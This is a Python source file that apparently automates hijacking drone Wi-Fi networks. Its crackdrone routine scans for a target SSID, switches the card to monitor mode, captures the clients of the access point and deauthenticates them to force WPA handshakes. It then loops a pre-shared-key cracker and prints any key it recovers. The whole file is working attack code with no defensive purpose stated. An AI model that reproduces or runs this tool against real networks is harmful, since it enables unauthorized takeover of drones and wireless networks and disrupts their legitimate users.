from accesspoint import AccessPoint
from target import Target
import commands
import re
import time
import sys

class Environment:
    
    def __init__(self, d=None, s=None, v=False):
        
        self.device = d
        self.ssid = s
        self.accesspoints = None
        self.targets = None
        self.mondevice = None
        self.monitormode = False
        self.initialized = False
        self.verbose = v
        
        if (d and s):
            self.initialize(d, s)
        
    def initialize(self, d, s):
        
        if not d and not s: raise ValueError('Must provide valid device and SSID.')
        if not d: raise ValueError('Must provide valid device.')
        if not s: raise ValueError('Must provide valid SSID.')
        
        self.device = d
        self.ssid = s
        self.accesspoints = self.__getaccesspoints(d, s)
        self.initialized = True
        
        if self.verbose:
            print "Environment initialized!"
            
        return self.accesspoints
            
            
    def setdevice(self, d):
        self.device = d
        self.initialized = False
        
        
    def setssid(self, s):
        self.ssid = s
        self.initialized = False
            
            
    def crackdrone(self, index):
        
        if index < len(self.accesspoints):
            print 'Cracking ' + str(self.accesspoints[index])
            self.__startmonitormode(index)
            self.__gettargets(index)
            self.__deauthtargets()
            self.__crackpsk(index)
            self.__stopmonitormode()
        else:
            print 'Out of bounds! Only ' + len(self.accesspoints) + ' drones found.'
            

    def __getaccesspoints(self, device, ssid):

        out = commands.searchssid(device, ssid, after=2)
        
        def createaccesspoint(ssidinfo):
            ssid = ''.join(filter(lambda line: 'SSID:' in line, ssidinfo.split('\n'))).replace('SSID:','').strip()
            channel = ''.join(filter(lambda line: 'DS Parameter set: channel' in line, ssidinfo.split('\n'))).replace('DS Parameter set: channel','').strip()
            return AccessPoint(s=ssid, c=channel)
        
        accesspoints = map(lambda ssidinfo: createaccesspoint(ssidinfo), out.split('--'))
        
        if self.verbose:
            print 'FOUND: ' + str(map(lambda accesspoint: str(accesspoint), accesspoints))

        return accesspoints
    
    
    def __deauthtargets(self):
        
        for target in self.targets:
            print str(target.mac) + ' deauthenticated!'
            commands.deauth(self.mondevice, target.accesspoint.mac, target.mac)
    
    
    def __crackpsk(self, index):
        
        time.sleep(20)
        out = 'No valid WPA handshakes found'
        for x in range(5):
            if ('No valid WPA handshakes found' not in out) or x > 4:
                results = re.match(r'KEY FOUND \[(.*)\]', out)
                if results:
                    print results.groups()
                    break
            else:
                accesspoint = self.accesspoints[index]   
                out = commands.crackpsk(accesspoint.mac, accesspoint.dumpfilename)
                time.sleep(5)
                print 'No handshake found. Still searching...'
      
    def __gettargets(self, index):
        
        accesspoint = self.accesspoints[index]
        commands.cleanfiles(accesspoint.dumpfilename, wildcard=True)
        commands.sniffssid(self.mondevice, accesspoint.ssid, accesspoint.channel, accesspoint.dumpfilename)
        
        time.sleep(20)
        
        try:
            with open(accesspoint.dumpfilename + '-01.csv', 'r') as f:
                lines = f.readlines()
                accesspoint.mac = ((lines[2].split(','))[0]).strip()
                self.targets = map(lambda client: Target(client.split(',')[0], accesspoint), filter(lambda fullline: accesspoint.mac in fullline, filter(lambda line: len(line.strip()) > 1, lines[5:])))
        except IOError:
            pass
    
    
    def __startmonitormode(self, index):
        
        accesspoint = self.accesspoints[index]
        commands.airmoncheckkill()
        commands.disabledevice(self.device)
        out = commands.startmonitormode(self.device, accesspoint.channel)

        try:
            self.mondevice = re.match(r'(.*)](.*)\)', ''.join(filter(lambda line: 'monitor mode vif enabled' in line, out.split('\n')))).groups('0')[1]
            self.monitormode = True
            print 'Monitor mode started on ' + self.mondevice + '...'
        except AttributeError:
            print 'Error entering monitor mode...'
        except:
            print("Unexpected error:", sys.exc_info()[0])
            raise
        
        
    def __stopmonitormode(self):
        
        commands.stopmonitormode(self.mondevice)
        commands.enabledevice(self.device)
        commands.startnetworkmanager()
        
        self.monitormode = False
        
        print 'Monitor mode stopped on ' + self.mondevice + '...'
    
    